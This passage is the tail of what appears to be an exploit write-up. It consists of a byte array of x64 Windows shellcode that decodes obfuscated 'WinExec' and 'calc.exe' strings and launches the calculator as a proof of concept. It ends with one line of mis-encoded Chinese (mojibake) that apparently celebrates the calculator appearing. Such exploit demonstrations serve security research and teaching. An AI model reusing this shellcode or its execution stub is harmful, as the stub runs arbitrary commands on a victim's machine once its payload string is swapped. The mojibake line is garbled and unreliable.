  0x8B, 0x04, 0x82, 0x4C, 0x01, 0xC0, 0x53, 0xC3, 0x48, 0x31,
  0xC9, 0x80, 0xC1, 0x07, 0x48, 0xB8, 0x0F, 0xA8, 0x96, 0x91,
  0xBA, 0x87, 0x9A, 0x9C, 0x48, 0xF7, 0xD0, 0x48, 0xC1, 0xE8,
  0x08, 0x50, 0x51, 0xE8, 0xB0, 0xFF, 0xFF, 0xFF, 0x49, 0x89,
  0xC6, 0x48, 0x31, 0xC9, 0x48, 0xF7, 0xE1, 0x50, 0x48, 0xB8,
  0x9C, 0x9E, 0x93, 0x9C, 0xD1, 0x9A, 0x87, 0x9A, 0x48, 0xF7,
  0xD0, 0x50, 0x48, 0x89, 0xE1, 0x48, 0xFF, 0xC2, 0x48, 0x83,
  0xEC, 0x30, 0x66, 0x81, 0xE4, 0xF0, 0xFF, 0x41, 0xFF, 0xD6]);
```

æ”¹å®Œä»¥åç»ˆäºçœ‹åˆ°äº†è®¡ç®—å™¨ã€‚ğŸ‰
